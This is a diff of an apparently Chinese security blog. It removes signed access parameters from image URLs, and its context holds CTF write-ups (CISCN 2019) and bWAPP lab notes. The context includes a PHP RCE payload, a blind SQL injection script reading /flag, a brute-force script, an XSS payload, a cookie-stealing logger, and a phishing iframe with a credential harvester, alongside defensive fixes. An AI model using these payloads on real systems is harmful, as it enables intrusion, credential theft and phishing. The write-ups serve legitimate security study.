@@ -372,13 +372,13 @@
 <li><p>考点 : 无参函数的 RCE</p>
 </li>
 <li><p>在注释中发现了 forgetpassword.php 页面</p>
-<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/ciscn_2019_HuaNan/ciscn_2019_HuaNan_web1.png?Expires=1562528694&OSSAccessKeyId=TMP.hUyLeYDC3aDYEoeA8f5Hs82NcVg4MnsLmaGAxZms9XTQXmZ1t8CSarDDLkbALnPzmzXxzh1a6HDGoDHXP2Nzrt4WhycG6ShhE8SXvj8wxy6xDNd4qiqxFcLb2XVGPR.tmp&Signature=bUbt%2FS15he%2FtrfuM789bucyQgSI%3D" alt></p>
+<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/ciscn_2019_HuaNan/ciscn_2019_HuaNan_web1.png" alt></p>
 </li>
 <li><p>打开 forgetpassword.php，要求输入一个用户名，尝试用户名爆破，结果为 <code>admin123</code></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://127.0.0.1/ciscn/web1/useri.php"</span></span><br><span class="line"></span><br><span class="line">response = <span class="string">"没有这个用户"</span></span><br><span class="line"></span><br><span class="line">f = open(<span class="string">"./username.txt"</span>, <span class="string">"r"</span>, encoding=<span class="string">"utf-8"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">	line = line.strip()</span><br><span class="line"></span><br><span class="line">	data = &#123;</span><br><span class="line">		<span class="string">"user_name"</span> : line,</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	r = requests.post(url=url, data=data)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> response <span class="keyword">in</span> r.text:</span><br><span class="line">		<span class="keyword">continue</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		print(line)</span><br><span class="line">		<span class="keyword">break</span></span><br></pre></td></tr></table></figure>
 </li>
 <li><p>输入 admin123 之后跳转到 useryzm.php 页面</p>
-<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/ciscn_2019_HuaNan/ciscn_2019_HuaNan_web1_2.png?Expires=1562528710&OSSAccessKeyId=TMP.hUyLeYDC3aDYEoeA8f5Hs82NcVg4MnsLmaGAxZms9XTQXmZ1t8CSarDDLkbALnPzmzXxzh1a6HDGoDHXP2Nzrt4WhycG6ShhE8SXvj8wxy6xDNd4qiqxFcLb2XVGPR.tmp&Signature=MUG69jnKhMH81KEDdCUK3Qx89zI%3D" alt></p>
+<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/ciscn_2019_HuaNan/ciscn_2019_HuaNan_web1_2.png" alt></p>
 </li>
 <li><p>提示验证码经过 base64 加密，而且验证码是 4 位的数字，写脚本爆破一下，结果验证码为 <code>MTQyMw==</code></p>
 <p>四位数字生成</p>
@@ -393,13 +393,13 @@
 </ul>
 <ul>
 <li><p>输入后获得密码 <code>f4h1l0t0j2g5b1m0a0m0a3d2d0</code></p>
-<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/ciscn_2019_HuaNan/ciscn_2019_HuaNan_web1_3.png?Expires=1562528728&OSSAccessKeyId=TMP.hUyLeYDC3aDYEoeA8f5Hs82NcVg4MnsLmaGAxZms9XTQXmZ1t8CSarDDLkbALnPzmzXxzh1a6HDGoDHXP2Nzrt4WhycG6ShhE8SXvj8wxy6xDNd4qiqxFcLb2XVGPR.tmp&Signature=XgiunCWg%2Bl1uyI39I%2BagRqdum9Y%3D" alt></p>
+<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/ciscn_2019_HuaNan/ciscn_2019_HuaNan_web1_3.png" alt></p>
 </li>
 <li><p>返回 index.html 输入账号密码，获得新提示，但是这里忘记复制数据库了，就直接跳到下一步吧，访问 mDjNaF.php</p>
-<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/ciscn_2019_HuaNan/ciscn_2019_HuaNan_web1_4.png?Expires=1562528742&OSSAccessKeyId=TMP.hUyLeYDC3aDYEoeA8f5Hs82NcVg4MnsLmaGAxZms9XTQXmZ1t8CSarDDLkbALnPzmzXxzh1a6HDGoDHXP2Nzrt4WhycG6ShhE8SXvj8wxy6xDNd4qiqxFcLb2XVGPR.tmp&Signature=TOO65BWBsD%2F1V%2F2c9DSMk4ZCz8k%3D" alt></p>
+<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/ciscn_2019_HuaNan/ciscn_2019_HuaNan_web1_4.png" alt></p>
 </li>
 <li><p>mDjNaF.php 页面</p>
-<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/ciscn_2019_HuaNan/ciscn_2019_HuaNan_web1_5.png?Expires=1562528750&OSSAccessKeyId=TMP.hUyLeYDC3aDYEoeA8f5Hs82NcVg4MnsLmaGAxZms9XTQXmZ1t8CSarDDLkbALnPzmzXxzh1a6HDGoDHXP2Nzrt4WhycG6ShhE8SXvj8wxy6xDNd4qiqxFcLb2XVGPR.tmp&Signature=eIzt9eK3CP6rvzGUunCMUcaWcLo%3D" alt></p>
+<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/ciscn_2019_HuaNan/ciscn_2019_HuaNan_web1_5.png" alt></p>
 </li>
 <li><p>看一下正则，<code>preg_replace(&#39;/[^\W]+\((?R)?\)/&#39;, &#39;&#39;, $_GET[&#39;code&#39;])</code>，<code>\W</code> 匹配任意字母和数字，<code>(?R)?</code> 重复整个模式，合在一起类似于匹配 <code>x(y(z()))</code> 样式的，且不能存在参数，输入 <code>phpinfo();</code> 可以查看 phpinfo 页面</p>
 </li>
@@ -410,34 +410,34 @@
 <li><p>payload : </p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?code=<span class="keyword">eval</span>(hex2bin(session_id(session_start())));</span><br><span class="line"><span class="comment">// echo 'peri0d';</span></span><br><span class="line">Cookie: PHPSESSID=<span class="number">6563686</span>f2027706572693064273b</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/ciscn_2019_HuaNan/ciscn_2019_HuaNan_web1_6.png?Expires=1562528764&OSSAccessKeyId=TMP.hUyLeYDC3aDYEoeA8f5Hs82NcVg4MnsLmaGAxZms9XTQXmZ1t8CSarDDLkbALnPzmzXxzh1a6HDGoDHXP2Nzrt4WhycG6ShhE8SXvj8wxy6xDNd4qiqxFcLb2XVGPR.tmp&Signature=u8UfrTw2JDTrGD0xRvkG3Ui672w%3D" alt></p>
+<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/ciscn_2019_HuaNan/ciscn_2019_HuaNan_web1_6.png" alt></p>
 </li>
 <li><p>还可以自己传参达到 RCE，get_defined_vars() 函数返回所有已定义的变量列表，然后利用提取位置的函数就可以实现 RCE</p>
 </li>
 <li><p>payload : <code>?code=eval(end(current(get_defined_vars())));&amp;a=var_dump(scandir(&#39;../&#39;))</code></p>
-<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/ciscn_2019_HuaNan/ciscn_2019_HuaNan_web1_7.png?Expires=1562528779&OSSAccessKeyId=TMP.hUyLeYDC3aDYEoeA8f5Hs82NcVg4MnsLmaGAxZms9XTQXmZ1t8CSarDDLkbALnPzmzXxzh1a6HDGoDHXP2Nzrt4WhycG6ShhE8SXvj8wxy6xDNd4qiqxFcLb2XVGPR.tmp&Signature=fr4Ss%2Fe1LycvaDVRJKrRi%2FxxrfU%3D" alt></p>
+<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/ciscn_2019_HuaNan/ciscn_2019_HuaNan_web1_7.png" alt></p>
 </li>
 </ul>
 <h1 id="web-4"><a href="#web-4" class="headerlink" title="web 4"></a>web 4</h1><ul>
 <li><p>考点 : insert() 盲注</p>
 </li>
 <li><p>一个登录页面</p>
-<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/ciscn_2019_HuaNan/ciscn_2019_HuaNan_web4_1.png?Expires=1562528797&OSSAccessKeyId=TMP.hUyLeYDC3aDYEoeA8f5Hs82NcVg4MnsLmaGAxZms9XTQXmZ1t8CSarDDLkbALnPzmzXxzh1a6HDGoDHXP2Nzrt4WhycG6ShhE8SXvj8wxy6xDNd4qiqxFcLb2XVGPR.tmp&Signature=64cWquzJr6UajXHSc%2FA%2FqJ3wrS8%3D" alt></p>
+<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/ciscn_2019_HuaNan/ciscn_2019_HuaNan_web4_1.png" alt></p>
 </li>
 <li><p>试一试万能密码 <code>admin&#39;#</code> ，登录成功，并给出提示</p>
-<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/ciscn_2019_HuaNan/ciscn_2019_HuaNan_web4_2.png?Expires=1562528807&OSSAccessKeyId=TMP.hUyLeYDC3aDYEoeA8f5Hs82NcVg4MnsLmaGAxZms9XTQXmZ1t8CSarDDLkbALnPzmzXxzh1a6HDGoDHXP2Nzrt4WhycG6ShhE8SXvj8wxy6xDNd4qiqxFcLb2XVGPR.tmp&Signature=sNmvXHsICFC%2Fln0B4wsZho8v%2F0Q%3D" alt></p>
+<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/ciscn_2019_HuaNan/ciscn_2019_HuaNan_web4_2.png" alt></p>
 </li>
 <li><p>经过 fuzz 发现过滤了空格，union，benchmark，sleep，regexp，order等很多很多关键字，空格可以使用 /**/ 绕过</p>
 </li>
 <li><p>给出了文件路径，可以使用 load_file 读取，再与 insert() 函数结合，使用异或，好像可以进行盲注</p>
-<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/ciscn_2019_HuaNan/ciscn_2019_HuaNan_web4_3.png?Expires=1562528823&OSSAccessKeyId=TMP.hUyLeYDC3aDYEoeA8f5Hs82NcVg4MnsLmaGAxZms9XTQXmZ1t8CSarDDLkbALnPzmzXxzh1a6HDGoDHXP2Nzrt4WhycG6ShhE8SXvj8wxy6xDNd4qiqxFcLb2XVGPR.tmp&Signature=YljqRWPUlSJ%2Ff6PWCedhhUppGuU%3D" alt></p>
+<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/ciscn_2019_HuaNan/ciscn_2019_HuaNan_web4_3.png" alt></p>
 </li>
 <li><p><code>insert((select(load_file(&#39;/flag&#39;))),2,255,&#39;&#39;)</code> 即在 flag 中，从第 2 个字符到第 255 个字符替换为空字符，即只显示第 1 个字符。<code>insert((select(load_file(&#39;/flag&#39;))),3,255,&#39;&#39;)</code>把第 3 个字符到第 255 个字符替换为空字符，即只显示前面两个字符。</p>
 </li>
 <li><p>脚本如下</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://172.27.137.145/ciscn/web4/index.php'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = "admin'^(select('f')&gt;(insert((select(load_file('/flag'))),2,255,'')))#"</span></span><br><span class="line"></span><br><span class="line">temp_list = []</span><br><span class="line"></span><br><span class="line">flag_list = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>,<span class="number">255</span>):</span><br><span class="line">	payload_1 = <span class="string">"')&gt;(insert((select(load_file('/flag'))),"</span>+str(i)+<span class="string">",255,'')))#"</span></span><br><span class="line">	flag = <span class="string">''</span>.join(flag_list)</span><br><span class="line">	temp_list.clear()</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">		payload = <span class="string">"admin'^(select('"</span>+flag+chr(j)+payload_1</span><br><span class="line">		print(payload)</span><br><span class="line">		data = &#123;<span class="string">'username'</span> : payload,&#125;</span><br><span class="line">		r = requests.post(url=url, data=data)</span><br><span class="line">		<span class="keyword">if</span> <span class="string">'success'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">			temp_list.append(chr(j))</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		flag_list.append(temp_list.pop())</span><br><span class="line">	<span class="keyword">except</span>:</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">print(<span class="string">''</span>.join(flag_list))</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/ciscn_2019_HuaNan/ciscn_2019_HuaNan_web4_4.png?Expires=1562528838&OSSAccessKeyId=TMP.hUyLeYDC3aDYEoeA8f5Hs82NcVg4MnsLmaGAxZms9XTQXmZ1t8CSarDDLkbALnPzmzXxzh1a6HDGoDHXP2Nzrt4WhycG6ShhE8SXvj8wxy6xDNd4qiqxFcLb2XVGPR.tmp&Signature=vQgvqfBnFaI%2Bi318rXfL2rLmeTc%3D" alt></p>
+<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/ciscn_2019_HuaNan/ciscn_2019_HuaNan_web4_4.png" alt></p>
 </li>
 <li><p>过滤语句 : </p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/union|benchmark|strcmp|locate|STRCMP|position|md5|mid|sub|concat|and|left|sleep|space|instr|conv|\s|right|cast|locate|limit|reverse|glob|having|match|count|pad|char|hex|regexp|order|group|ascii|information/i"</span>,$username))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'wafed!&lt;br&gt;'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/union|position|strcmp|locate|benchmark|STRCMP|concat|md5|mid|sub|sleep|and|left|cast|space|instr|pad|conv|\s|right|limit|reverse|locate|match|glob|having|count|char|hex|regexp|order|group|ascii|information/i"</span>,$passwd))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'wafed!&lt;br&gt;'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
@@ -1010,7 +1010,7 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$cookie = $_GET[<span class="string">'cookie'</span>];</span><br><span class="line">$log = fopen(<span class="string">'cookie.txt'</span>,<span class="string">'a'</span>);</span><br><span class="line">fwrite($log, $cookie);</span><br><span class="line">fwrite(<span class="string">"\n"</span>);</span><br><span class="line">fclose($log);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>效果</p>
-<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/bwapp/html_1.png?Expires=1562563258&OSSAccessKeyId=TMP.hXQMERydCTiaSvmwYhquu78sn4oKBL3JdPxPSRuw64JqYj7VUagP7PoPDEyjDx8yyVWmArvb9aeLo6USa6vM7PqZ6HSZxrtJbnuzr64vFeBRi8FXMi6P78zfBu7c1Q.tmp&Signature=Waw%2FVyeDT2HP9EkJF9pGXCt6f9k%3D" alt></p>
+<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/bwapp/html_1.png" alt></p>
 <h3 id="钓鱼"><a href="#钓鱼" class="headerlink" title="钓鱼"></a>钓鱼</h3><p>payload ：</p>
 <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//192.168.233.1/htmli_get.php?firstname=</span></span><br><span class="line">&lt;script&gt;</span><br><span class="line"><span class="built_in">document</span>.body.innerHTML=(</span><br><span class="line"><span class="string">'&lt;div style="position:absolute;top:0px;left:0px;width:100%;high:100%;"&gt;'</span>+</span><br><span class="line"><span class="string">'&lt;iframe src=http://192.168.233.1/fish.html width=100% height=100%&gt;'</span>+</span><br><span class="line"><span class="string">'&lt;/iframe&gt;&lt;/div&gt;'</span></span><br><span class="line">);</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
 
@@ -1022,7 +1022,7 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$data = fopen(<span class="string">"loginfile.txt"</span>,<span class="string">"a+"</span>);</span><br><span class="line">$login = $_POST[<span class="string">'username'</span>];</span><br><span class="line">$pass = $_POST[<span class="string">'password'</span>];</span><br><span class="line">fwrite($data, <span class="string">"Username: $login"</span>);</span><br><span class="line">fwrite(<span class="string">"\n"</span>);</span><br><span class="line">fwrite($data, <span class="string">"Password: $pass"</span>);</span><br><span class="line">fwrite(<span class="string">"\n"</span>);</span><br><span class="line">fclose($data);</span><br><span class="line"><span class="comment">//重定向 URL</span></span><br><span class="line">Header(<span class="string">"location: http://192.168.233.133/bWAPP/htmli_get.php"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>效果</p>
-<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/bwapp/html_2.png?Expires=1562563267&OSSAccessKeyId=TMP.hXQMERydCTiaSvmwYhquu78sn4oKBL3JdPxPSRuw64JqYj7VUagP7PoPDEyjDx8yyVWmArvb9aeLo6USa6vM7PqZ6HSZxrtJbnuzr64vFeBRi8FXMi6P78zfBu7c1Q.tmp&Signature=EXQDiitIVsB8GIxNA4Dgqztzxys%3D" alt></p>
+<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/bwapp/html_2.png" alt></p>
 <h2 id="防护方式"><a href="#防护方式" class="headerlink" title="防护方式"></a>防护方式</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">htmli</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $input = str_replace(<span class="string">"&lt;"</span>, <span class="string">"&amp;lt;"</span>, $data);</span><br><span class="line">    $input = str_replace(<span class="string">"&gt;"</span>, <span class="string">"&amp;gt;"</span>, $input);</span><br><span class="line"></span><br><span class="line">    $input = urldecode($input);</span><br><span class="line">    <span class="keyword">return</span> $input;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>将 <code>&lt;</code> 和 <code>&gt;</code> 替换为 HTML 实体，然后进行 URL 解码</p>
@@ -1073,7 +1073,7 @@
 <h2 id="利用方式-4"><a href="#利用方式-4" class="headerlink" title="利用方式"></a>利用方式</h2><p>payload ：</p>
 <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//闭合 iframe 之后再写入注入脚本</span></span><br><span class="line">?ParamUrl=robots.txt&amp;ParamWidth=<span class="number">250</span>&amp;ParamHeight=<span class="number">250</span><span class="string">"&gt;&lt;/iframe&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/bwapp/html_3.png?Expires=1562563282&OSSAccessKeyId=TMP.hXQMERydCTiaSvmwYhquu78sn4oKBL3JdPxPSRuw64JqYj7VUagP7PoPDEyjDx8yyVWmArvb9aeLo6USa6vM7PqZ6HSZxrtJbnuzr64vFeBRi8FXMi6P78zfBu7c1Q.tmp&Signature=xjrDESQNf5L2GYUfuuqXv68neTs%3D" alt></p>
+<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/bwapp/html_3.png" alt></p>
 <h2 id="防护方式-4"><a href="#防护方式-4" class="headerlink" title="防护方式"></a>防护方式</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">xss</span><span class="params">($data, $encoding = <span class="string">"UTF-8"</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> htmlspecialchars($data, ENT_QUOTES, $encoding);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>使用 htmlspecialchars 进行转义，无法绕过</p>
@@ -1085,15 +1085,15 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// xss 过滤</span><br><span class="line">function xss($data)&#123;</span><br><span class="line">	return addslashes($data);</span><br><span class="line">&#125;</span><br><span class="line">// 输出传入参数</span><br><span class="line">echo $_SERVER[&quot;QUERY_STRING&quot;].&quot;&lt;br&gt;&quot;;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt;</span><br><span class="line">&lt;title&gt; iframe xss&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt; xss &lt;/h1&gt;</span><br><span class="line">&lt;p&gt;This is an iframe xss !&lt;/p&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&quot;ParamHeight&quot;]) &amp;&amp; isset($_GET[&quot;ParamWidth&quot;]))</span><br><span class="line">&#123;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;iframe frameborder=&quot;0&quot; src=&quot;xss.txt&quot; height=&quot;&lt;?php echo xss($_GET[&quot;ParamHeight&quot;])?&gt;&quot; width=&quot;&lt;?php echo xss($_GET[&quot;ParamWidth&quot;])?&gt;&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
 
 <p>结果：</p>
-<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/bwapp/html_4.png?Expires=1562563296&OSSAccessKeyId=TMP.hXQMERydCTiaSvmwYhquu78sn4oKBL3JdPxPSRuw64JqYj7VUagP7PoPDEyjDx8yyVWmArvb9aeLo6USa6vM7PqZ6HSZxrtJbnuzr64vFeBRi8FXMi6P78zfBu7c1Q.tmp&Signature=sOnXPmO%2FRoxXpRNwBI53iXTqHtA%3D" alt></p>
+<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/bwapp/html_4.png" alt></p>
 <h1 id="LDAP-Injection-Search"><a href="#LDAP-Injection-Search" class="headerlink" title="LDAP Injection (Search)"></a>LDAP Injection (Search)</h1><h2 id="补充知识"><a href="#补充知识" class="headerlink" title="补充知识"></a>补充知识</h2><p>LDAP 是轻量级目录访问协议。</p>
 <p>目录服务是一种特殊的数据库，专门用于保存某些属性的详细信息，比如，电话簿，地址簿，人员组织管理等等。</p>
 <p>而 LDAP 类似于目录服务，只不过存储的是文件目录，存储位置为各大厂商，比如 SUN，IBM，Microsoft等等。LDAP 本身并不是目录数据库。它是一种提供访问目录数据库方法的服务和协议。</p>
 <p>LDAP目录服务是由目录数据库和一套访问协议组成的系统。LDAP不仅可以从目录数据库查询对象，还可以用于管理和身份验证。</p>
 <p>一些参数如图：</p>
-<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/bwapp/html_5.png?Expires=1562563307&OSSAccessKeyId=TMP.hXQMERydCTiaSvmwYhquu78sn4oKBL3JdPxPSRuw64JqYj7VUagP7PoPDEyjDx8yyVWmArvb9aeLo6USa6vM7PqZ6HSZxrtJbnuzr64vFeBRi8FXMi6P78zfBu7c1Q.tmp&Signature=vxB%2BlzFeZtalUBkFqQS%2FtyIoH3A%3D" alt></p>
+<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/bwapp/html_5.png" alt></p>
 <p>如果把 LDAP 和 数据库类比起来，数据库是以 表-字段-值 的形式来存储数据，而 LDAP 目录是以树的形式存储数据。dn 和库名对应，dc 和表名对应，ou 和字段对应，cn 是要查询的目标名称</p>
-<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/bwapp/html_6.png?Expires=1562563319&OSSAccessKeyId=TMP.hXQMERydCTiaSvmwYhquu78sn4oKBL3JdPxPSRuw64JqYj7VUagP7PoPDEyjDx8yyVWmArvb9aeLo6USa6vM7PqZ6HSZxrtJbnuzr64vFeBRi8FXMi6P78zfBu7c1Q.tmp&Signature=botjXr9xYNgtI13ONbJw7%2BiUSbs%3D" alt></p>
+<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/bwapp/html_6.png" alt></p>
 <h2 id="产生原因-5"><a href="#产生原因-5" class="headerlink" title="产生原因"></a>产生原因</h2><h2 id="利用方式-5"><a href="#利用方式-5" class="headerlink" title="利用方式"></a>利用方式</h2><p>This could result in the execution of arbitrary commands such as granting permissions to unauthorized queries, and content modification inside the LDAP tree.The same advanced exploitation techniques available in SQL Injection can be similarly applied in LDAP Injection.</p>
 <p>CVE-2018-12689</p>
 <p>CVE-2018-5730</p>
@@ -1162,7 +1162,7 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sqli</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> mysql_real_escape_string($data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>mysql_real_escape_string 函数转义 SQL 语句中使用的字符串中的特殊字符，暂时没有绕过</p>
-<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/bwapp/html_7.png?Expires=1562563332&OSSAccessKeyId=TMP.hXQMERydCTiaSvmwYhquu78sn4oKBL3JdPxPSRuw64JqYj7VUagP7PoPDEyjDx8yyVWmArvb9aeLo6USa6vM7PqZ6HSZxrtJbnuzr64vFeBRi8FXMi6P78zfBu7c1Q.tmp&Signature=yuIsfVqSqsU%2FriO7PvOxHmLqIh0%3D" alt></p>
+<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/bwapp/html_7.png" alt></p>
 <p>这两处防护无法绕过，因为绕过需要闭合 <code>&#39;%</code>，就必须要 <code>&#39;</code>，这两个函数过滤了 <code>&#39;&#39;</code></p>
